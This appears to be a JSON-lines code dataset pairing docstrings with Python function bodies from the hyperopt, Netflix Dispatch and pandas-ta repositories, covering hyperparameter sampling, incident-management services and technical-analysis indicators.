{"docstring": "\"\"\"Retrieve data attached to `doc` by `attach_blob`.\n\nRaises OperationFailure if `name` does not correspond to an attached blob.\n\nReturns the blob as a string.\n\"\"\"\n", "func_signal": "def get_attachment(self, doc, name):\n", "code": "attachments = doc.get(\"_attachments\", [])\nfile_ids = [a[1] for a in attachments if a[0] == name]\nif not file_ids:\n    raise OperationFailure(\"Attachment not found: %s\" % name)\nif len(file_ids) > 1:\n    raise OperationFailure(\"multiple name matches\", (name, file_ids))\nreturn self.gfs.get(file_ids[0]).read()", "path": "hyperopt/hyperopt/mongoexp.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "\"\"\"\nReturn a new value for one hyperparameter.\n\nParameters:\n-----------\n\nmemo - a partially-filled dictionary of node -> list-of-values\n       for the nodes in a vectorized representation of the\n       original search space.\n\nnode - an Apply instance in the vectorized search space,\n       which corresponds to a hyperparameter\n\nlabel - a string, the name of the hyperparameter\n\n\nReturns: a list with one value in it: the suggested value for this\nhyperparameter\n\n\nNotes\n-----\n\nThis function works by delegating to self.hp_HPTYPE functions to\nhandle each of the kinds of hyperparameters in hyperopt.pyll_utils.\n\nOther search algorithms can implement this function without\ndelegating based on the hyperparameter type, but it's a pattern\nI've used a few times so I show it here.\n\n\"\"\"\n", "func_signal": "def on_node_hyperparameter(self, memo, node, label):\n", "code": "n_observations = len(self.node_vals[label])\nif n_observations > 0:\n    # -- Pick a previous trial on which to base the new sample\n    size = memo[node.arg[\"size\"]]\n    loss, tid, val = self.choose_ltv(label, size=size)\n    try:\n        handler = getattr(self, \"hp_%s\" % node.name)\n    except AttributeError:\n        raise NotImplementedError(\"Annealing\", node.name)\n    return handler(memo, node, label, tid, val)\nelse:\n    # -- Draw the new sample from the prior\n    return ExprEvaluator.on_node(self, memo, node)", "path": "hyperopt/hyperopt/anneal.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "# -- each argument is an idxs, vals pair\n", "func_signal": "def foo(arg):\n", "code": "assert arg.name == \"pos_args\"\nassert len(arg.pos_args) == 2\narg_vals = arg.pos_args[1]\nif arg_vals.name == \"asarray\" and arg_vals.inputs()[0].name == \"repeat\":\n    # -- draws are iid, so forget about\n    #    repeating the distribution parameters\n    repeated_thing = arg_vals.inputs()[0].inputs()[1]\n    return repeated_thing\nelse:\n    if arg.pos_args[0] is idxs:\n        return arg_vals\n    # -- arg.pos_args[0] is a superset of idxs\n    #    TODO: slice out correct elements using\n    #    idxs_take, but more importantly - test this case.\n    raise NotImplementedError()", "path": "hyperopt/hyperopt/vectorize.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "\"\"\"Unpacks a url of the form\n    protocol://[username[:pw]]@hostname[:port]/db/collection\n\n:rtype: tuple of strings\n:returns: protocol, username, password, hostname, port, dbname, collection\n\n:note:\nIf the password is not given in the url but the username is, then\nthis function will read the password from file by calling\n``open(pwfile).read()[:-1]``\n\n\"\"\"\n\n", "func_signal": "def parse_url(url, pwfile=None):\n", "code": "protocol = url[: url.find(\":\")]\nftp_url = \"ftp\" + url[url.find(\":\") :]\n\n# -- parse the string as if it were an ftp address\ntmp = urllib.parse.urlparse(ftp_url)\nquery_params = urllib.parse.parse_qs(tmp.query)\n\nlogger.info(\"PROTOCOL %s\" % protocol)\nlogger.info(\"USERNAME %s\" % tmp.username)\nlogger.info(\"HOSTNAME %s\" % tmp.hostname)\nlogger.info(\"PORT %s\" % tmp.port)\nlogger.info(\"PATH %s\" % tmp.path)\n\nauthdbname = None\nif \"authSource\" in query_params and len(query_params[\"authSource\"]):\n    authdbname = query_params[\"authSource\"][-1]\n\nlogger.info(\"AUTH DB %s\" % authdbname)\n\ntry:\n    _, dbname, collection = tmp.path.split(\"/\")\nexcept:\n    print(\"Failed to parse '%s'\" % (str(tmp.path)), file=sys.stderr)\n    raise\nlogger.info(\"DB %s\" % dbname)\nlogger.info(\"COLLECTION %s\" % collection)\n\nif tmp.password is None:\n    if (tmp.username is not None) and pwfile:\n        password = open(pwfile).read()[:-1]\n    else:\n        password = None\nelse:\n    password = tmp.password\nif password is not None:\n    logger.info(\"PASS ***\")\nport = int(float(tmp.port))  # port has to be casted explicitly here.\n\nreturn (\n    protocol,\n    tmp.username,\n    password,\n    tmp.hostname,\n    port,\n    dbname,\n    collection,\n    authdbname,\n)", "path": "hyperopt/hyperopt/mongoexp.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "\"\"\"\nParameters: See `hp_uniform`\n\"\"\"\n", "func_signal": "def hp_categorical(self, memo, node, label, tid, val):\n", "code": "size = memo[node.arg[\"size\"]]\nif size == 0:\n    return []\nval1 = np.atleast_1d(val)\np = p_orig = np.asarray(memo[node.arg[\"p\"]])\nif p.ndim == 2:\n    if len(p) not in (1, len(val1)):\n        print(node)\n        print(p)\n        print(np.asarray(p).shape)\n    assert len(p) in (1, len(val1))\nelse:\n    assert p.ndim == 1\n    p = p[np.newaxis, :]\nif val1.size:\n    counts = old_div(np.bincount(val1, minlength=p.size), float(val1.size))\n    prior = self.shrinking(label)\nelse:\n    counts = np.zeros(p.size)\n    prior = 1.0\nnew_p = (1 - prior) * counts + prior * p\nassert new_p.ndim == 2\nrval = categorical(p=new_p, rng=self.rng, size=size)\nif p_orig.ndim == 1:\n    assert len(rval) == 1\n    return rval[0]\nreturn rval", "path": "hyperopt/hyperopt/anneal.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "\"\"\"Attach potentially large data string `blob` to `doc` by name `name`\n\nblob must be a string\n\ndoc must have been saved in some collection (must have an _id), but not\nnecessarily the jobs collection.\n\nname must be a string\n\nReturns None\n\"\"\"\n\n# If there is already a file with the given name for this doc, then we will delete it\n# after writing the new file\n", "func_signal": "def set_attachment(self, doc, blob, name, collection=None):\n", "code": "attachments = doc.get(\"_attachments\", [])\nname_matches = [a for a in attachments if a[0] == name]\n\n# the filename is set to something so that fs.list() will display the file\nnew_file_id = self.gfs.put(blob, filename=\"{}_{}\".format(doc[\"_id\"], name))\nlogger.info(\n    \"stored blob of %i bytes with id=%s and filename %s_%s\"\n    % (len(blob), str(new_file_id), doc[\"_id\"], name)\n)\n\nnew_attachments = [a for a in attachments if a[0] != name] + [\n    (name, new_file_id)\n]\n\ntry:\n    ii = 0\n    doc = self.update(\n        doc, {\"_attachments\": new_attachments}, collection=collection\n    )\n    # there is a database leak until we actually delete the files that\n    # are no longer pointed to by new_attachments\n    while ii < len(name_matches):\n        self.gfs.delete(name_matches[ii][1])\n        ii += 1\nexcept:\n    while ii < len(name_matches):\n        logger.warning(\n            \"Leak during set_attachment: old_file_id=%s\" % (name_matches[ii][1])\n        )\n        ii += 1\n    raise\nassert len([n for n in self.attachment_names(doc) if n == name]) == 1\n# return new_file_id", "path": "hyperopt/hyperopt/mongoexp.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "\"\"\"\nParameters: See `hp_uniform`\n\"\"\"\n", "func_signal": "def hp_qnormal(self, memo, node, label, tid, val):\n", "code": "return qnormal(\n    mu=val,\n    sigma=memo[node.arg[\"sigma\"]] * self.shrinking(label),\n    q=memo[node.arg[\"q\"]],\n    rng=self.rng,\n    size=memo[node.arg[\"size\"]],\n)", "path": "hyperopt/hyperopt/anneal.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "\"\"\"\nParameters: See `hp_uniform`\n\"\"\"\n", "func_signal": "def hp_qlognormal(self, memo, node, label, tid, val):\n", "code": "return qlognormal(\n    # -- prevent log(0) without messing up algo\n    mu=np.log(1e-16 + val),\n    sigma=memo[node.arg[\"sigma\"]] * self.shrinking(label),\n    q=memo[node.arg[\"q\"]],\n    rng=self.rng,\n    size=memo[node.arg[\"size\"]],\n)", "path": "hyperopt/hyperopt/anneal.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "# -- each argument is an idxs, vals pair\n", "func_signal": "def foo(arg):\n", "code": "assert arg.name == \"pos_args\"\nassert len(arg.pos_args) == 2\narg_vals = arg.pos_args[1]\n\n# XXX: write a pattern-substitution rule for this case\nif arg_vals.name == \"idxs_take\":\n    if arg_vals.arg[\"vals\"].name == \"asarray\":\n        if arg_vals.arg[\"vals\"].inputs()[0].name == \"repeat\":\n            # -- draws are iid, so forget about\n            #    repeating the distribution parameters\n            repeated_thing = arg_vals.arg[\"vals\"].inputs()[0].inputs()[1]\n            return repeated_thing\nif arg.pos_args[0] is idxs:\n    return arg_vals\nelse:\n    # -- arg.pos_args[0] is a superset of idxs\n    #    TODO: slice out correct elements using\n    #    idxs_take, but more importantly - test this case.\n    raise NotImplementedError()", "path": "hyperopt/hyperopt/vectorize.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "\"\"\"Runs all scheduled tasks.\"\"\"\n", "func_signal": "def start(self):\n", "code": "while True:\n    schedule.run_pending()\n    time.sleep(1)", "path": "dispatch/src/dispatch/scheduler.py", "commit_date": "2020-02-10 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"Fetches executive report template document.\"\"\"\n", "func_signal": "def get_executive_report_template(*, db_session):\n", "code": "return (\n    db_session.query(Document).filter(\n        Document.resource_type == INCIDENT_RESOURCE_EXECUTIVE_REPORT_DOCUMENT_TEMPLATE\n    )\n).one_or_none()", "path": "dispatch/src/dispatch/document/service.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"Adds a task to the scheduler.\"\"\"\n\n", "func_signal": "def add(self, job, *args, **kwargs):\n", "code": "def decorator(func):\n    if not kwargs.get(\"name\"):\n        name = func.__name__\n    else:\n        name = kwargs.pop(\"name\")\n\n    self.registered_tasks.append({\"name\": name, \"func\": func, \"job\": job.do(func)})\n\nreturn decorator", "path": "dispatch/src/dispatch/scheduler.py", "commit_date": "2020-02-10 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"The service method returns a list of conferences that match a given resource type. We'll test\nto ensure that the first and last items returned match the desired resource type.\"\"\"\n", "func_signal": "def test_conference_get_by_resource_type(session, conference):\n", "code": "from dispatch.conference.service import get_by_resource_type\n\nconferences = get_by_resource_type(db_session=session, resource_type=conference.resource_type)\n\nassert conferences[0].resource_type == conference.resource_type\nassert conferences[-1].resource_type == conference.resource_type", "path": "dispatch/tests/conference/test_conference_service.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"Fetches incident faq docment.\"\"\"\n", "func_signal": "def get_incident_faq_document(*, db_session):\n", "code": "return (\n    db_session.query(Document).filter(\n        Document.resource_type == INCIDENT_RESOURCE_INCIDENT_FAQ_DOCUMENT\n    )\n).one_or_none()", "path": "dispatch/src/dispatch/document/service.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"Sends a workflow notification.\"\"\"\n", "func_signal": "def send_workflow_notification(conversation_id, message_template, db_session, **kwargs):\n", "code": "notification_text = \"Incident Notification\"\nnotification_type = \"incident-notification\"\n\nplugin = plugin_service.get_active(db_session=db_session, plugin_type=\"conversation\")\nplugin.instance.send(\n    conversation_id, notification_text, message_template, notification_type, **kwargs\n)", "path": "dispatch/src/dispatch/workflow/flows.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"Sets the description\"\"\"\n", "func_signal": "def set_description(cls, v, values):\n", "code": "if not v:\n    return \"No Description\"\nreturn v", "path": "dispatch/src/dispatch/workflow/models.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"Fetches incident investigation template sheet.\"\"\"\n", "func_signal": "def get_incident_investigation_sheet_template(*, db_session):\n", "code": "return (\n    db_session.query(Document).filter(\n        Document.resource_type == INCIDENT_RESOURCE_INVESTIGATION_SHEET_TEMPLATE\n    )\n).one_or_none()", "path": "dispatch/src/dispatch/document/service.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"Adds plugin endpoints to the event router.\"\"\"\n", "func_signal": "def install_plugin_events(api):\n", "code": "for plugin in plugins.all():\n    if plugin.events:\n        api.include_router(plugin.events, prefix=\"/events\", tags=[\"events\"])", "path": "dispatch/src/dispatch/common/utils/cli.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "# we generate a password for those that don't have one\n", "func_signal": "def password_required(cls, v):\n", "code": "password = v or generate_password()\nreturn hash_password(password)", "path": "dispatch/src/dispatch/auth/models.py", "commit_date": "2020-11-09 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"The test should not rely on the conferences created earlier, to pass.\nTherefore, we pass \"conferences\" as an argument, to manually create several in the DB.\n\"\"\"\n\n", "func_signal": "def test_conference_get_all(session, conferences):\n", "code": "from dispatch.conference.service import get_all\n\ntest_conferences = get_all(db_session=session).all()\n\nassert len(test_conferences) > 1", "path": "dispatch/tests/conference/test_conference_service.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"\n:returns: Revision number of this branch/checkout, if available. None if\n    no revision number can be determined.\n\"\"\"\n", "func_signal": "def get_revision():\n", "code": "if \"DISPATCH_BUILD\" in os.environ:\n    return os.environ[\"DISPATCH_BUILD\"]\npackage_dir = os.path.dirname(__file__)\ncheckout_dir = os.path.normpath(os.path.join(package_dir, os.pardir, os.pardir))\npath = os.path.join(checkout_dir)\nif os.path.exists(path):\n    return _get_git_revision(path)\nreturn None", "path": "dispatch/src/dispatch/__init__.py", "commit_date": "2020-10-20 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"Returns all documents that have need had a recent evergreen notification.\"\"\"\n", "func_signal": "def get_overdue_evergreen_documents(*, db_session) -> List[Optional[Document]]:\n", "code": "documents = (db_session.query(Document).filter(Document.evergreen == True)).all()  # noqa\noverdue_documents = []\nnow = datetime.utcnow()\n\nfor d in documents:\n    next_reminder = d.evergreen_last_reminder_at + timedelta(days=d.evergreen_reminder_interval)\n    if now > next_reminder:\n        overdue_documents.append(d)\n\nreturn overdue_documents", "path": "dispatch/src/dispatch/document/service.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"Gets a document by it's resource_id or creates a new document.\"\"\"\n", "func_signal": "def get_or_create(*, db_session, document_in) -> Document:\n", "code": "if hasattr(document_in, \"resource_id\"):\n    q = db_session.query(Document).filter(Document.resource_id == document_in.resource_id)\nelse:\n    q = db_session.query(Document).filter_by(**document_in.dict())\n\ninstance = q.first()\nif instance:\n    return instance\n\nreturn create(db_session=db_session, document_in=document_in)", "path": "dispatch/src/dispatch/document/service.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"Fetches conversation reference document.\"\"\"\n", "func_signal": "def get_conversation_reference_document(*, db_session):\n", "code": "return (\n    db_session.query(Document).filter(\n        Document.resource_type == INCIDENT_RESOURCE_CONVERSATION_REFERENCE_DOCUMENT\n    )\n).one_or_none()", "path": "dispatch/src/dispatch/document/service.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"Decorator that sets up the a background task function\nwith a database session and exception tracking.\n\nAs background tasks run in their own threads, it does not attempt\nto propagate errors.\n\"\"\"\n\n", "func_signal": "def background_task(func):\n", "code": "@wraps(func)\ndef wrapper(*args, **kwargs):\n    background = False\n    if not kwargs.get(\"db_session\"):\n        db_session = SessionLocal()\n        background = True\n        kwargs[\"db_session\"] = db_session\n    try:\n        metrics_provider.counter(\"function.call.counter\", tags={\"function\": fullname(func)})\n        start = time.perf_counter()\n        result = func(*args, **kwargs)\n        elapsed_time = time.perf_counter() - start\n        metrics_provider.timer(\n            \"function.elapsed.time\", value=elapsed_time, tags={\"function\": fullname(func)}\n        )\n        return result\n    except Exception as e:\n        log.exception(e)\n    finally:\n        if background:\n            kwargs[\"db_session\"].close()\n\nreturn wrapper", "path": "dispatch/src/dispatch/decorators.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"Fetches incident review template document.\"\"\"\n", "func_signal": "def get_incident_review_template(*, db_session):\n", "code": "return (\n    db_session.query(Document).filter(\n        Document.resource_type == INCIDENT_RESOURCE_INCIDENT_REVIEW_DOCUMENT_TEMPLATE\n    )\n).one_or_none()", "path": "dispatch/src/dispatch/document/service.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"\nReturns a boolean representing if this plugin is enabled.\n>>> plugin.is_enabled()\n\"\"\"\n", "func_signal": "def is_enabled(self) -> bool:\n", "code": "if not self.enabled:\n    return False\nif not self.can_disable:\n    return True\nreturn True", "path": "dispatch/src/dispatch/plugins/base/v1.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"\nInstalls plugins associated with dispatch\n:return:\n\"\"\"\n\n", "func_signal": "def install_plugins():\n", "code": "for ep in pkg_resources.iter_entry_points(\"dispatch.plugins\"):\n    logger.info(f\"Attempting to load plugin: {ep.name}\")\n    try:\n        plugin = ep.load()\n        register(plugin)\n        logger.info(f\"Successfully loaded plugin: {ep.name}\")\n    except SQLAlchemyError:\n        logger.error(\n            \"Something went wrong with creating plugin rows, is the database setup correctly?\"\n        )\n    except KeyError as e:\n        logger.info(f\"Failed to load plugin {ep.name} due to missing configuration items. {e}\")\n    except Exception:\n        logger.error(f\"Failed to load plugin {ep.name}:{traceback.format_exc()}\")", "path": "dispatch/src/dispatch/common/utils/cli.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"Determines the default resolution time.\"\"\"\n", "func_signal": "def default_resolution_time(context):\n", "code": "task_source = context.get_current_parameters()[\"source\"]\nif task_source == TaskSource.incident:\n    return datetime.utcnow() + timedelta(days=1)\nif task_source == TaskSource.post_incident_review:\n    return datetime.utcnow() + timedelta(days=7)\nreturn datetime.utcnow() + timedelta(days=1)", "path": "dispatch/src/dispatch/task/models.py", "commit_date": "2020-11-06 00:00:00", "repo_name": "Netflix/dispatch", "stars": 4516, "license": "apache-2.0", "language": "python", "size": 62049}
{"docstring": "\"\"\"Indicator: Chande Forcast Oscillator (CFO)\"\"\"\n# Validate Arguments\n", "func_signal": "def cfo(close, length=None, scalar=None, drift=None, offset=None, **kwargs):\n", "code": "close = verify_series(close)\nlength = int(length) if length and length > 0 else 9\nscalar = float(scalar) if scalar else 100\ndrift = get_drift(drift)\noffset = get_offset(offset)\n\n# Finding linear regression of Series\ncfo = scalar * (close - linreg(close, length=length, tsf=True))\ncfo /= close\n\n# Offset\nif offset != 0:\n    cfo = cfo.shift(offset)\n\n# Handle fills\nif \"fillna\" in kwargs:\n    cfo.fillna(kwargs[\"fillna\"], inplace=True)\nif \"fill_method\" in kwargs:\n    cfo.fillna(method=kwargs[\"fill_method\"], inplace=True)\n\n# Name and Categorize it\ncfo.name = f\"CFO_{length}\"\ncfo.category = \"momentum\"\n\nreturn cfo", "path": "pandas-ta/pandas_ta/momentum/cfo.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Indicator: William's Percent R (WILLR)\"\"\"\n# Validate arguments\n", "func_signal": "def willr(high, low, close, length=None, offset=None, **kwargs):\n", "code": "high = verify_series(high)\nlow = verify_series(low)\nclose = verify_series(close)\nlength = int(length) if length and length > 0 else 14\nmin_periods = int(kwargs[\"min_periods\"]) if \"min_periods\" in kwargs and kwargs[\"min_periods\"] is not None else length\noffset = get_offset(offset)\n\n# Calculate Result\nlowest_low = low.rolling(length, min_periods=min_periods).min()\nhighest_high = high.rolling(length, min_periods=min_periods).max()\n\nwillr = 100 * ((close - lowest_low) / (highest_high - lowest_low) - 1)\n\n# Offset\nif offset != 0:\n    willr = willr.shift(offset)\n\n# Handle fills\nif \"fillna\" in kwargs:\n    willr.fillna(kwargs[\"fillna\"], inplace=True)\nif \"fill_method\" in kwargs:\n    willr.fillna(method=kwargs[\"fill_method\"], inplace=True)\n\n# Name and Categorize it\nwillr.name = f\"WILLR_{length}\"\nwillr.category = \"momentum\"\n\nreturn willr", "path": "pandas-ta/pandas_ta/momentum/willr.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Indicator: Relative Vigor Index (RVGI)\"\"\"\n# Validate Arguments\n", "func_signal": "def rvgi(open_, high, low, close, length=None, swma_length=None, offset=None, **kwargs):\n", "code": "open_ = verify_series(open_)\nhigh = verify_series(high)\nlow = verify_series(low)\nclose = verify_series(close)\nhigh_low_range = non_zero_range(high, low)\nclose_open_range = non_zero_range(close, open_)\nlength = int(length) if length and length > 0 else 14\nswma_length = int(swma_length) if swma_length and swma_length > 0 else 4\noffset = get_offset(offset)\n\n# Calculate Result\nnumerator = swma(close_open_range, length=swma_length).rolling(length).sum()\ndenominator = swma(high_low_range, length=swma_length).rolling(length).sum()\n\nrvgi = numerator / denominator\nsignal = swma(rvgi, length=swma_length)\n\n# Offset\nif offset != 0:\n    rvgi = rvgi.shift(offset)\n    signal = signal.shift(offset)\n\n# Handle fills\nif \"fillna\" in kwargs:\n    rvgi.fillna(kwargs[\"fillna\"], inplace=True)\n    signal.fillna(kwargs[\"fillna\"], inplace=True)\nif \"fill_method\" in kwargs:\n    rvgi.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    signal.fillna(method=kwargs[\"fill_method\"], inplace=True)\n\n# Name & Category\nrvgi.name = f\"RVGI_{length}_{swma_length}\"\nsignal.name = f\"RVGIs_{length}_{swma_length}\"\nrvgi.category = signal.category = \"momentum\"\n\n# Prepare DataFrame to return\ndf = DataFrame({rvgi.name: rvgi, signal.name: signal})\ndf.name = f\"RVGI_{length}_{swma_length}\"\ndf.category = rvgi.category\n\nreturn df", "path": "pandas-ta/pandas_ta/momentum/rvgi.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Indicator: Drawdown (DD)\"\"\"\n# Validate Arguments\n", "func_signal": "def drawdown(close, offset=None, **kwargs) -> DataFrame:\n", "code": "close = verify_series(close)\noffset = get_offset(offset)\n\n# Calculate Result\nmax_close = close.cummax()\ndd = max_close - close\ndd_pct = 1 - (close / max_close)\n\n_np_err = seterr()\nseterr(divide=\"ignore\", invalid=\"ignore\")\ndd_log = nplog(max_close) - nplog(close)\nseterr(divide=_np_err[\"divide\"], invalid=_np_err[\"invalid\"])\n\n# Offset\nif offset != 0:\n    dd = dd.shift(offset)\n    dd_pct = dd_pct.shift(offset)\n    dd_log = dd_log.shift(offset)\n\n# Handle fills\nif \"fillna\" in kwargs:\n    dd.fillna(kwargs[\"fillna\"], inplace=True)\n    dd_pct.fillna(kwargs[\"fillna\"], inplace=True)\n    log_return.fillna(kwargs[\"fillna\"], inplace=True)\nif \"fill_method\" in kwargs:\n    dd.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    dd_pct.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    dd_log.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    \n# Name and Categorize it\ndd.name = \"DD\"\ndd_pct.name = f\"{dd.name}_PCT\"\ndd_log.name = f\"{dd.name}_LOG\"\ndd.category = dd_pct.category = dd_log.category = \"performance\"\n\n# Prepare DataFrame to return\ndata = {dd.name: dd, dd_pct.name: dd_pct, dd_log.name: dd_log}\ndf = DataFrame(data)\ndf.name = dd.name\ndf.category = dd.category\n\nreturn df", "path": "pandas-ta/pandas_ta/performance/drawdown.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Indicator: Ease of Movement (EOM)\"\"\"\n# Validate arguments\n", "func_signal": "def eom(high, low, close, volume, length=None, divisor=None, drift=None, offset=None, **kwargs):\n", "code": "high = verify_series(high)\nlow = verify_series(low)\nclose = verify_series(close)\nvolume = verify_series(volume)\nlength = int(length) if length and length > 0 else 14\ndivisor = divisor if divisor and divisor > 0 else 100000000\ndrift = get_drift(drift)\noffset = get_offset(offset)\n\n# Calculate Result\nhigh_low_range = non_zero_range(high, low)\ndistance  = hl2(high=high, low=low)\ndistance -= hl2(high=high.shift(drift), low=low.shift(drift))\nbox_ratio = volume / divisor\nbox_ratio /= high_low_range\neom = distance / box_ratio\neom = sma(eom, length=length)\n\n# Offset\nif offset != 0:\n    eom = eom.shift(offset)\n\n# Handle fills\nif \"fillna\" in kwargs:\n    eom.fillna(kwargs[\"fillna\"], inplace=True)\nif \"fill_method\" in kwargs:\n    eom.fillna(method=kwargs[\"fill_method\"], inplace=True)\n\n# Name and Categorize it\neom.name = f\"EOM_{length}_{divisor}\"\neom.category = \"volume\"\n\nreturn eom", "path": "pandas-ta/pandas_ta/volume/eom.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Indicator: Kaufman's Adaptive Moving Average (HMA)\"\"\"\n# Validate Arguments\n", "func_signal": "def kama(close, length=None, fast=None, slow=None, drift=None, offset=None, **kwargs):\n", "code": "close = verify_series(close)\nlength = int(length) if length and length > 0 else 10\nfast = int(fast) if fast and fast > 0 else 2\nslow = int(slow) if slow and slow > 0 else 30\ndrift = get_drift(drift)\noffset = get_offset(offset)\n\n# Calculate Result\nm = close.size\n\ndef weight(length: int) -> float:\n    return 2 / (length + 1)\n\nfr = weight(fast)\nsr = weight(slow)\n\nabs_diff = non_zero_range(close, close.shift(length)).abs()\npeer_diff = non_zero_range(close, close.shift(drift)).abs()\npeer_diff_sum = peer_diff.rolling(length).sum()\ner = abs_diff / peer_diff_sum\nx = er * (fr - sr) + sr\nsc = x * x\n\nresult = [npNaN for _ in range(0, length - 1)] + [0]\nfor i in range(length, m):\n    result.append(sc[i] * close[i] + (1 - sc[i]) * result[i - 1])\n\nkama = Series(result, index=close.index)\n\n# Offset\nif offset != 0:\n    kama = kama.shift(offset)\n\n# Name & Category\nkama.name = f\"KAMA_{length}_{fast}_{slow}\"\nkama.category = \"overlap\"\n\nreturn kama", "path": "pandas-ta/pandas_ta/overlap/kama.py", "commit_date": "2020-11-13 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Indicator: Exponential Moving Average (EMA)\"\"\"\n# Validate Arguments\n", "func_signal": "def ema(close, length=None, offset=None, **kwargs):\n", "code": "close = verify_series(close)\nlength = int(length) if length and length > 0 else 10\nadjust = kwargs.pop(\"adjust\", False)\nsma = kwargs.pop(\"sma\", True)\noffset = get_offset(offset)\n\n# Calculate Result\nif sma:\n    close = close.copy()\n    sma_nth = close[0:length].mean()\n    close[:length - 1] = npNaN\n    close.iloc[length - 1] = sma_nth\nema = close.ewm(span=length, adjust=adjust).mean()\n\n# Offset\nif offset != 0:\n    ema = ema.shift(offset)\n\n# Name & Category\nema.name = f\"EMA_{length}\"\nema.category = \"overlap\"\n\nreturn ema", "path": "pandas-ta/pandas_ta/overlap/ema.py", "commit_date": "2020-11-13 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
